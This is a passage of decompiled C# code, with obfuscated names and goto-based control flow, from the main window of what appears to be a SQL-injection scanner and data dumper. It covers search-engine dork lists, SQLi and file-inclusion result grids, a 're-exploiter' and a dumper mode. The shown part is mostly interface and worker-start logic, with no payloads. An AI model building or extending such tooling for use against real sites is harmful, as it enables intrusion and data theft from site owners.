						case 37:
							goto IL_01ef;
						case 39:
							goto IL_01f9;
						case 41:
							goto IL_0204;
						case 42:
							goto IL_0213;
						case 43:
							goto IL_0221;
						case 38:
						case 40:
						case 44:
						case 45:
						case 46:
							goto IL_0235;
						case 47:
							goto IL_025f;
						case 48:
							goto IL_0269;
						case 49:
							goto IL_0274;
						case 50:
							goto IL_0282;
						case 51:
							goto IL_0296;
						case 52:
						case 53:
							goto IL_02a5;
						case 54:
							goto IL_02ae;
						case 55:
							goto IL_02c0;
						case 56:
							goto IL_02c8;
						case 57:
							goto IL_02f1;
						case 58:
							goto IL_02fa;
						case 59:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 19:
						case 60:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_02c8:
					num = 56;
					method_17(Globals.translate_0.GetStr(this, 0) + " " + Globals.APP_VERSION);
					goto IL_02f1;
					IL_02f1:
					num = 57;
					ResumeLayout();
					goto IL_02fa;
					IL_02c0:
					num = 55;
					Globals.ReleaseMemory();
					goto IL_02c8;
					IL_02fa:
					num = 58;
					Show();
					break;
					IL_000a:
					num = 2;
					Text = Globals.APP_VERSION;
					goto IL_0017;
					IL_0017:
					num = 3;
					base.Icon = Class6.icon;
					goto IL_0024;
					IL_0024:
					num = 4;
					ntfTray.Text = Text;
					goto IL_0037;
					IL_0037:
					num = 5;
					ntfTray.Icon = base.Icon;
					goto IL_004a;
					IL_004a:
					num = 6;
					Class2.Class3_0.Splash_0.SetLoading(Globals.translate_0.GetStr(this, 10, "Initializing.."));
					goto IL_006d;
					IL_006d:
					num = 7;
					if (!File.Exists(Globals.XML_PATH))
					{
						goto IL_007e;
					}
					goto IL_0097;
					IL_007e:
					num = 8;
					Class50.smethod_0();
					goto IL_0085;
					IL_0085:
					num = 9;
					Class50.smethod_3(this);
					goto IL_008f;
					IL_008f:
					num = 10;
					Class50.smethod_1();
					goto IL_0097;
					IL_0097:
					num = 12;
					Globals.G_SOCKS = new Class35();
					goto IL_00a4;
					IL_00a4:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_00ac;
					IL_00ac:
					num = 14;
					Globals.G_DataGP = new DataGP(new MemoryStream(Encoding.ASCII.GetBytes((string)Versioned.CallByName(Globals.GMain, "Tag", CallType.Get)), writable: true));
					goto IL_00e6;
					IL_00e6:
					num = 15;
					Versioned.CallByName(Globals.GMain, "Tag", CallType.Set, new object[1]);
					goto IL_0100;
					IL_0100:
					ProjectData.ClearProjectError();
					num3 = 0;
					goto IL_0107;
					IL_0107:
					num = 17;
					if (!Globals.IS_DUMP_INSTANCE)
					{
						goto IL_0114;
					}
					goto IL_0122;
					IL_0114:
					num = 18;
					if (method_7())
					{
						goto end_IL_0001_3;
					}
					goto IL_0122;
					IL_0122:
					num = 22;
					Versioned.CallByName(this, "smethod_8", CallType.Method);
					goto IL_0138;
					IL_0138:
					num = 23;
					Class2.Class3_0.Splash_0.SetLoading(Globals.translate_0.GetStr(this, 11, "Loading Settings.."));
					goto IL_015c;
					IL_015c:
					num = 24;
					method_73();
					goto IL_0165;
					IL_0165:
					num = 25;
					Class2.Class3_0.Splash_0.SetLoading(Globals.translate_0.GetStr(this, 12, "Loading GUI.."));
					goto IL_0189;
					IL_0189:
					num = 26;
					method_60();
					goto IL_0193;
					IL_0193:
					num = 27;
					if (Globals.IS_DUMP_INSTANCE)
					{
						goto IL_019d;
					}
					goto IL_01b3;
					IL_019d:
					num = 28;
					DumperForm.tlsMenu.Visible = false;
					goto IL_01ef;
					IL_01b3:
					num = 30;
					method_59();
					goto IL_01bd;
					IL_01bd:
					num = 31;
					method_58();
					goto IL_01c7;
					IL_01c7:
					num = 32;
					method_64();
					goto IL_01d0;
					IL_01d0:
					num = 33;
					Globals.GStatistics = new Class26();
					goto IL_01dd;
					IL_01dd:
					num = 34;
					method_19();
					goto IL_01e6;
					IL_01e6:
					num = 35;
					method_212();
					goto IL_01ef;
					IL_01ef:
					num = 37;
					if (!Globals.IS_DUMP_INSTANCE)
					{
						goto IL_01f9;
					}
					goto IL_0235;
					IL_01f9:
					num = 39;
					if (!bool_3)
					{
						goto IL_0204;
					}
					goto IL_0235;
					IL_0204:
					num = 41;
					twMain.Focus();
					goto IL_0213;
					IL_0213:
					num = 42;
					twMain.ExpandAll();
					goto IL_0221;
					IL_0221:
					num = 43;
					twMain.SelectedNode = treeNode_0;
					goto IL_0235;
					IL_0235:
					num = 46;
					base.Size = new Size(MinimumSize.Width, MinimumSize.Height);
					goto IL_025f;
					IL_025f:
					num = 47;
					bool_2 = true;
					goto IL_0269;
					IL_0269:
					num = 48;
					method_123(null, null);
					goto IL_0274;
					IL_0274:
					num = 49;
					if (!bool_3)
					{
						goto IL_0282;
					}
					goto IL_02a5;
					IL_0282:
					num = 50;
					twMain.SelectedNode = treeNode_0;
					goto IL_0296;
					IL_0296:
					num = 51;
					twMain.Focus();
					goto IL_02a5;
					IL_02a5:
					num = 53;
					method_88();
					goto IL_02ae;
					IL_02ae:
					num = 54;
					Class2.Class3_0.Splash_0.Close();
					goto IL_02c0;
					end_IL_0001_2:
					break;
				}
				num = 59;
				method_0();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1041;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				bool lockTaken;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 708:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
							goto IL_001a;
						case 5:
							goto IL_0098;
						case 8:
							goto IL_00a5;
						case 7:
						case 9:
						case 10:
							goto IL_00ae;
						case 11:
							goto IL_00c9;
						case 12:
							goto IL_013c;
						case 13:
						case 14:
							goto IL_0146;
						case 15:
							goto IL_0150;
						case 16:
							goto IL_0159;
						case 17:
							goto IL_0166;
						case 18:
							goto IL_0173;
						case 19:
							goto IL_017d;
						case 20:
							goto IL_0187;
						case 21:
							goto IL_0190;
						case 22:
						case 23:
							goto IL_0199;
						case 24:
							goto IL_01a3;
						case 25:
							goto IL_01b5;
						case 26:
							goto IL_01be;
						case 27:
							goto IL_01c7;
						case 28:
						case 29:
							goto IL_01d0;
						case 30:
							goto IL_01de;
						case 31:
							goto IL_01f8;
						case 32:
						case 33:
							goto IL_0201;
						case 34:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 6:
						case 35:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01be:
					num = 26;
					Globals.DG_SQLiNoInjectable = null;
					goto IL_01c7;
					IL_01c7:
					num = 27;
					Globals.DG_FileInclusao = null;
					goto IL_01d0;
					IL_01b5:
					num = 25;
					Globals.DG_SQLi = null;
					goto IL_01be;
					IL_01d0:
					num = 29;
					if (!bool_0)
					{
						goto IL_01de;
					}
					goto IL_0201;
					IL_000a:
					num = 2;
					if (!bool_2)
					{
						goto end_IL_0001_3;
					}
					goto IL_001a;
					IL_001a:
					num = 4;
					if (_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init == null)
					{
						Interlocked.CompareExchange(ref _0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init, new StaticLocalInitFlag(), null);
					}
					lockTaken = false;
					try
					{
						Monitor.Enter(_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init, ref lockTaken);
						if (_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init.State == 0)
						{
							_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init.State = 2;
							_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled = false;
						}
						else if (_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init.State = 1;
						if (lockTaken)
						{
							Monitor.Exit(_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init);
						}
					}
					goto IL_0098;
					IL_01f8:
					num = 31;
					method_72();
					goto IL_0201;
					IL_01de:
					num = 30;
					Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(1));
					goto IL_01f8;
					IL_0098:
					num = 5;
					if (_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled)
					{
						goto end_IL_0001_3;
					}
					goto IL_00a5;
					IL_00a5:
					num = 8;
					_0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled = true;
					goto IL_00ae;
					IL_00ae:
					num = 10;
					if (enum6_0 != 0 || DumperForm.Boolean_0)
					{
						goto IL_00c9;
					}
					goto IL_0146;
					IL_0201:
					num = 33;
					Process.GetCurrentProcess().WaitForExit(1000);
					break;
					IL_00c9:
					num = 11;
					lock (this)
					{
						using (new Class8(this))
						{
							if (MessageBox.Show(Globals.translate_0.GetStr(this, 1), Globals.translate_0.GetStr(this, 2), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
							{
								e.Cancel = true;
								goto end_IL_0001_3;
							}
						}
					}
					goto IL_013c;
					IL_013c:
					num = 12;
					bool_2 = false;
					goto IL_0146;
					IL_0146:
					num = 14;
					bool_2 = false;
					goto IL_0150;
					IL_0150:
					num = 15;
					Hide();
					goto IL_0159;
					IL_0159:
					num = 16;
					Globals.translate_0.Save();
					goto IL_0166;
					IL_0166:
					num = 17;
					if (!Globals.IS_DUMP_INSTANCE)
					{
						goto IL_0173;
					}
					goto IL_0199;
					IL_0173:
					num = 18;
					method_61();
					goto IL_017d;
					IL_017d:
					num = 19;
					method_62();
					goto IL_0187;
					IL_0187:
					num = 20;
					method_68();
					goto IL_0190;
					IL_0190:
					num = 21;
					method_65();
					goto IL_0199;
					IL_0199:
					num = 23;
					method_63();
					goto IL_01a3;
					IL_01a3:
					num = 24;
					if (Globals.GQueue.method_0() == null)
					{
						goto IL_01b5;
					}
					goto IL_01d0;
					end_IL_0001_2:
					break;
				}
				num = 34;
				Process.GetCurrentProcess().Kill();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 708;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_2(object sender, FormClosingEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 439:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
							goto IL_001a;
						case 5:
							goto IL_0034;
						case 6:
						case 7:
							goto IL_00ac;
						case 8:
							goto IL_00bd;
						case 9:
							goto IL_00c5;
						case 10:
							goto IL_00ce;
						case 11:
						case 12:
							goto IL_00d7;
						case 13:
							goto IL_00e0;
						case 14:
							goto IL_00ed;
						case 15:
							goto IL_00f8;
						case 16:
							goto IL_0106;
						case 17:
						case 18:
						case 19:
							goto IL_0120;
						case 20:
							goto IL_0128;
						case 21:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 22:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00f8:
					num = 15;
					if (!bool_0)
					{
						goto IL_0106;
					}
					goto IL_0120;
					IL_0106:
					num = 16;
					Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(1));
					goto IL_0120;
					IL_00ed:
					num = 14;
					method_69(null, null);
					goto IL_00f8;
					IL_0120:
					num = 19;
					Application.DoEvents();
					goto IL_0128;
					IL_000a:
					num = 2;
					if (!bool_2)
					{
						goto end_IL_0001_3;
					}
					goto IL_001a;
					IL_001a:
					num = 4;
					if (enum6_0 != 0 || DumperForm.Boolean_0)
					{
						goto IL_0034;
					}
					goto IL_00ac;
					IL_0128:
					num = 20;
					Process.GetCurrentProcess().WaitForExit(3000);
					break;
					IL_0034:
					num = 5;
					lock (Globals.GMain)
					{
						using (new Class8(Globals.GMain))
						{
							if (MessageBox.Show(Globals.translate_0.GetStr(this, 1), Globals.translate_0.GetStr(this, 2), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
							{
								e.Cancel = true;
								goto end_IL_0001_3;
							}
						}
					}
					goto IL_00ac;
					IL_00ac:
					num = 7;
					if (Globals.GQueue.method_0() == null)
					{
						goto IL_00bd;
					}
					goto IL_00d7;
					IL_00bd:
					num = 8;
					Globals.DG_SQLi = null;
					goto IL_00c5;
					IL_00c5:
					num = 9;
					Globals.DG_SQLiNoInjectable = null;
					goto IL_00ce;
					IL_00ce:
					num = 10;
					Globals.DG_FileInclusao = null;
					goto IL_00d7;
					IL_00d7:
					num = 12;
					Hide();
					goto IL_00e0;
					IL_00e0:
					num = 13;
					if (!Globals.IS_DUMP_INSTANCE)
					{
						goto IL_00ed;
					}
					goto IL_0120;
					end_IL_0001_2:
					break;
				}
				num = 21;
				Process.GetCurrentProcess().Kill();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 439;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void MainForm_Resize(object sender, EventArgs e)
	{
		if ((base.WindowState == FormWindowState.Minimized) & chkSysTray.Checked)
		{
			ntfTray.Visible = true;
			Hide();
		}
		else
		{
			ntfTray.Visible = false;
		}
	}

	private void method_3()
	{
		method_72();
		DumperForm.method_74();
	}

	private static void smethod_10(Form form_0, IntPtr intptr_0, int int_14)
	{
		checked
		{
			try
			{
				Struct9 @struct = default(Struct9);
				object obj = Marshal.PtrToStructure(intptr_0, typeof(Struct9));
				@struct = ((obj != null) ? ((Struct9)obj) : default(Struct9));
				if (@struct.int_1 == 0 || @struct.int_0 == 0)
				{
					return;
				}
				Rectangle rectangle = form_0.RectangleToScreen(form_0.ClientRectangle);
				rectangle.Width += SystemInformation.FrameBorderSize.Width - int_14;
				rectangle.Height += SystemInformation.FrameBorderSize.Height + SystemInformation.CaptionHeight;
				Rectangle workingArea = Screen.GetWorkingArea(form_0.ClientRectangle);
				if (@struct.int_0 >= workingArea.X - 10 && @struct.int_0 <= workingArea.X + 10)
				{
					@struct.int_0 = workingArea.X;
				}
				int num = Screen.GetBounds(Screen.PrimaryScreen.Bounds).Height - workingArea.Height;
				if ((@struct.int_1 >= -10 && workingArea.Y > 0 && @struct.int_1 <= num + 10) || (workingArea.Y <= 0 && @struct.int_1 <= 10))
				{
					if (num > 0)
					{
						@struct.int_1 = workingArea.Y;
					}
					else
					{
						@struct.int_1 = 0;
					}
				}
				if (@struct.int_0 + rectangle.Width <= workingArea.Right + 10 && @struct.int_0 + rectangle.Width >= workingArea.Right - 10)
				{
					@struct.int_0 = workingArea.Right - (rectangle.Width + SystemInformation.FrameBorderSize.Width);
				}
				if (@struct.int_1 + rectangle.Height <= workingArea.Bottom + 10 && @struct.int_1 + rectangle.Height >= workingArea.Bottom - 10)
				{
					@struct.int_1 = workingArea.Bottom - (rectangle.Height + SystemInformation.FrameBorderSize.Height);
				}
				Marshal.StructureToPtr(@struct, intptr_0, fDeleteOld: true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		if (base.WindowState == FormWindowState.Minimized)
		{
			Show();
			base.WindowState = FormWindowState.Normal;
			ntfTray.Visible = false;
		}
		else
		{
			Focus();
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		cmbGUIHotKey.Enabled = chkGUIHotKey.Checked;
		if (bool_2)
		{
			Form form_ = this;
			Class48.smethod_1(ref form_);
			if (cmbGUIHotKey.Enabled)
			{
				form_ = this;
				Class48.smethod_0(ref form_, cmbGUIHotKey.Text.ToLower(), Class48.Enum7.const_1);
			}
		}
	}

	private void method_6(object sender, EventArgs e)
	{
		if (bool_2)
		{
			method_5(null, null);
		}
	}

	protected override void WndProc(ref Message m)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int msg;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 127:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 6:
							goto IL_0022;
						case 4:
							goto IL_0031;
						case 3:
						case 5:
						case 7:
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_000a:
					num = 2;
					msg = m.Msg;
					if (msg != 70)
					{
						if (msg != 786)
						{
							break;
						}
						goto IL_0022;
					}
					goto IL_0031;
					IL_0031:
					num = 4;
					smethod_10(this, m.LParam, 0);
					break;
					IL_0022:
					num = 6;
					Class48.smethod_2(m.WParam);
					break;
					end_IL_0001_2:
					break;
				}
				num = 8;
				base.WndProc(ref m);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 127;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, long long_0, [MarshalAs(UnmanagedType.LPStr)] StringBuilder stringBuilder_0);

	[DllImport("user32.dll")]
	private static extern bool SetForegroundWindow(IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool ShowWindowAsync(IntPtr intptr_0, int int_14);

	[DllImport("user32.dll")]
	private static extern bool IsIconic(IntPtr intptr_0);

	private bool method_7()
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		Process[] processesByName = Process.GetProcessesByName(processName);
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processesByName;
		int num = 0;
		IntPtr mainWindowHandle;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (currentProcess.Id != process.Id)
				{
					mainWindowHandle = process.MainWindowHandle;
					if (!(!process.MainWindowTitle.StartsWith(Globals.APP_VERSION) | string.IsNullOrEmpty(process.MainWindowTitle)) && process.MainModule.FileName.Equals(currentProcess.MainModule.FileName))
					{
						break;
					}
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		if (IsIconic(mainWindowHandle))
		{
			ShowWindowAsync(mainWindowHandle, 9);
		}
		SetForegroundWindow(mainWindowHandle);
		Process.GetCurrentProcess().Kill();
		return true;
	}

	private void method_8()
	{
		try
		{
			Globals.COMMAND_LINE_ARGS = Environment.GetCommandLineArgs();
			Globals.IS_DUMP_INSTANCE = Globals.COMMAND_LINE_ARGS.Length > 2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal void method_9(string string_5, string string_6, List<string> list_3 = null)
	{
		try
		{
			if (list_3 == null)
			{
				list_3 = new List<string>();
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = Application.ExecutablePath;
			processStartInfo.Arguments = "\"" + string_5 + "\"";
			ProcessStartInfo processStartInfo2;
			(processStartInfo2 = processStartInfo).Arguments = processStartInfo2.Arguments + " \"" + string_6 + "\"";
			if (list_3 != null)
			{
				foreach (string item in list_3)
				{
					string text = item;
					try
					{
						if (text.Contains(" "))
						{
							text = text.Substring(text.LastIndexOf(" ")).Trim();
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					string[] array = Strings.Split(text, ".");
					if (array.Length > 1)
					{
						(processStartInfo2 = processStartInfo).Arguments = processStartInfo2.Arguments + " \"" + array[0] + "." + array[1] + "\"";
					}
				}
			}
			Process.Start(processStartInfo);
			Globals.G_SOCKS.method_15();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10(object sender, EventArgs e)
	{
		if (bool_3)
		{
			if (uxTabControl_0.SelectedIndex == 0)
			{
				enum6_0 = Enum6.const_1;
			}
			else if ((uxTabControl_0.SelectedIndex == 1) | (uxTabControl_0.SelectedIndex == 2))
			{
				if (dtgQueue.RowCount == 0)
				{
					if (!method_20())
					{
						return;
					}
					enum6_0 = Enum6.const_3;
				}
				else
				{
					enum6_0 = Enum6.const_2;
				}
			}
			else
			{
				Interaction.Beep();
			}
		}
		else if (twMain.SelectedNode.Text.Equals(treeNode_0.Text))
		{
			enum6_0 = Enum6.const_1;
		}
		else if (twMain.SelectedNode.Text.Equals(treeNode_4.Text) | twMain.SelectedNode.Text.Equals(treeNode_1.Text))
		{
			if (dtgQueue.RowCount == 0)
			{
				if (!method_20())
				{
					return;
				}
				enum6_0 = Enum6.const_3;
			}
			else
			{
				enum6_0 = Enum6.const_2;
			}
		}
		else
		{
			Interaction.Beep();
		}
		method_16();
	}

	private void method_11(object sender, EventArgs e)
	{
		btnPause.Checked = false;
		btnPause.Enabled = false;
		btnStop.Enabled = false;
		bcWorker.CancelAsync();
		if (enum6_0 != Enum6.const_1)
		{
			AppControlDomain.Abort();
		}
		method_22(0);
		Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
		if (enum6_0 == Enum6.const_1)
		{
			foreach (SearchEngine value in dictionary_0.Values)
			{
				value.StopScanning();
			}
		}
		if (threadPool_0 != null)
		{
			threadPool_0.AbortThreads();
		}
	}

	private void method_12(object sender, EventArgs e)
	{
		enum6_0 = Enum6.const_4;
		method_16();
	}

	private void method_13(object sender, EventArgs e)
	{
		btnSearchColumnPause.Checked = false;
		btnSearchColumnPause.Enabled = false;
		btnSearchColumnStop.Enabled = false;
		bcWorker.CancelAsync();
		AppControlDomain.Abort();
	}

	private void method_14(object sender, EventArgs e)
	{
		ReExploiterForm = new ReExploiter();
		ReExploiterForm.FormBorderStyle = FormBorderStyle.FixedToolWindow;
		checked
		{
			ReExploiterForm.Size = new Size(250, ReExploiterForm.tsWorker.Size.Height + 30);
			ReExploiterForm.Top = (int)Math.Round((double)Globals.GMain.Top + (double)Globals.GMain.Height / 2.0 - (double)ReExploiterForm.Height / 2.0);
			ReExploiterForm.Left = (int)Math.Round((double)Globals.GMain.Left + (double)Globals.GMain.Width / 2.0 - (double)ReExploiterForm.Width / 2.0);
			if (dtgSQLi.SelectedRows.Count > 1)
			{
				ReExploiterForm.ShowDialog(this);
				return;
			}
			enum6_0 = Enum6.const_5;
			method_16();
		}
	}

	internal void method_15()
	{
		enum6_0 = Enum6.const_5;
		ReExploiterForm.Hide();
		method_16();
	}

	private void method_16()
	{
		try
		{
			btnPause.Checked = false;
			btnSearchColumnPause.Checked = false;
			if (enum6_0 == Enum6.const_1)
			{
				dictionary_0 = new Dictionary<Globals.SearchHost, SearchEngine>();
				list_0 = new List<string>();
				int num = checked(lstSearchEngine.Items.Count - 1);
				for (int i = 0; i <= num; i = checked(i + 1))
				{
					if (lstSearchEngine.GetItemChecked(i))
					{
						Globals.SearchHost searchHost = (Globals.SearchHost)Conversions.ToByte(lstSearchEngine.Items[i]);
						dictionary_0.Add(searchHost, new SearchEngine((byte)searchHost));
					}
				}
				if (dictionary_0.Count == 0)
				{
					method_1(Globals.translate_0.GetStr(this, 3));
					lstSearchEngine.Focus();
					enum6_0 = Enum6.const_0;
					Interaction.Beep();
					return;
				}
				string[] lines = txtMultiDorks.Lines;
				foreach (string text in lines)
				{
					if (!string.IsNullOrEmpty(text) && !list_0.Contains(text))
					{
						list_0.Add(text);
					}
				}
				if (list_0.Count == 0)
				{
					method_1(Globals.translate_0.GetStr(this, 4));
					txtMultiDorks.Focus();
					enum6_0 = Enum6.const_0;
					Interaction.Beep();
					return;
				}
				Globals.GQueue.method_12();
			}
			else if (enum6_0 == Enum6.const_4)
			{
				list_1 = new List<string>();
				if (chkSearchColumn.Checked)
				{
					string text2 = cmbSearchColumn.Text.Trim();
					if (!string.IsNullOrEmpty(text2) & !list_1.Contains(text2))
					{
						list_1.Add(text2);
					}
				}
				if (chkSearchColumn2.Checked)
				{
					string text2 = cmbSearchColumn2.Text.Trim();
					if (!string.IsNullOrEmpty(text2) & !list_1.Contains(text2))
					{
						list_1.Add(text2);
					}
				}
				if (chkSearchColumn3.Checked)
				{
					string text2 = cmbSearchColumn3.Text.Trim();
					if (!string.IsNullOrEmpty(text2) & !list_1.Contains(text2))
					{
						list_1.Add(text2);
					}
				}
				if (chkSearchColumn4.Checked)
				{
					string text2 = cmbSearchColumn4.Text.Trim();
					if (!string.IsNullOrEmpty(text2) & !list_1.Contains(text2))
					{
						list_1.Add(text2);
					}
				}
				if (list_1.Count == 0)
				{
					method_1(Globals.translate_0.GetStr(this, 5));
					cmbSearchColumn.Focus();
					enum6_0 = Enum6.const_0;
					Interaction.Beep();
					return;
				}
				list_2 = new List<DataGridViewRow>();
				foreach (DataGridViewRow selectedRow in dtgSQLi.SelectedRows)
				{
					Class54.smethod_6(Conversions.ToString(selectedRow.Cells[2].Value));
					list_2.Add(selectedRow);
				}
				if (list_2.Count == 0)
				{
					method_1(Globals.translate_0.GetStr(this, 6));
					dtgSQLi.Focus();
					enum6_0 = Enum6.const_0;
					Interaction.Beep();
					return;
				}
				checkSearchType_0 = ((cmbSearchColumnType.SelectedIndex != 0) ? CheckSearchType.Tables : CheckSearchType.Columns);
				searchColumn_0 = new SearchColumn(bExploiter: true, dtgSQLi);
				searchColumn_0.Text = Globals.translate_0.GetStr(this, 7) + " " + ((cmbSearchColumnType.SelectedIndex == 0) ? Globals.translate_0.GetStr(this, 8) : Globals.translate_0.GetStr(this, 9)) + " " + (chkSearchColumn.Checked ? cmbSearchColumn.Text : "") + " " + (chkSearchColumn2.Checked ? cmbSearchColumn2.Text : "").Replace("  ", " ") + (chkSearchColumn3.Checked ? cmbSearchColumn3.Text : "").Replace("  ", " ") + (chkSearchColumn4.Checked ? cmbSearchColumn4.Text : "").Replace("  ", " ");
				searchColumn_0.Show(this);
				searchColumn_0.Visible = false;
			}
			else if ((enum6_0 == Enum6.const_2) | (enum6_0 == Enum6.const_3))
			{
				struct10_0 = default(Struct10);
			}
			else
			{
				if (enum6_0 != Enum6.const_5)
				{
					throw new Exception("StartWorker?");
				}
				list_2 = new List<DataGridViewRow>();
				foreach (DataGridViewRow selectedRow2 in dtgSQLi.SelectedRows)
				{
					Types types_ = Class54.smethod_6(Conversions.ToString(selectedRow2.Cells[2].Value));
					if (Class54.smethod_9(types_) | Class54.smethod_10(types_))
					{
						list_2.Add(selectedRow2);
					}
				}
				if (list_2.Count == 0)
				{
					method_1("Select Items");
					dtgSQLi.Focus();
					enum6_0 = Enum6.const_0;
					Interaction.Beep();
					return;
				}
				struct10_0 = default(Struct10);
			}
			method_18(bool_5: false);
			bcWorker.RunWorkerAsync();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_17(string string_5)
	{
		method_1(string_5);
		method_18(bool_5: true);
		dictionary_0 = null;
		list_0 = null;
		threadPool_0 = null;
		enum6_0 = Enum6.const_0;
		smethod_6(null, null);
	}

	private void method_18(bool bool_5)
	{
		Globals.LockWindowUpdate(base.Handle);
		btnStart.Visible = bool_5;
		btnPause.Visible = !bool_5;
		btnPauseSP.Visible = !bool_5;
		btnStop.Visible = !bool_5;
		btnStart.Enabled = bool_5;
		btnPause.Enabled = !bool_5;
		btnStop.Enabled = !bool_5;
		Globals.G_Taskbar.SetProgressValue(0, 100);
		if (bool_5)
		{
			Globals.G_Taskbar.SetProgressState(ProgressBarState.NoProgress);
		}
		else
		{
			Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
		}
		checked
		{
			if (enum6_0 == Enum6.const_1)
			{
				lblSearchSummary_1.Visible = !bool_5;
				lblSearchSummary_2.Visible = !bool_5;
				txtMultiDorks.Visible = bool_5;
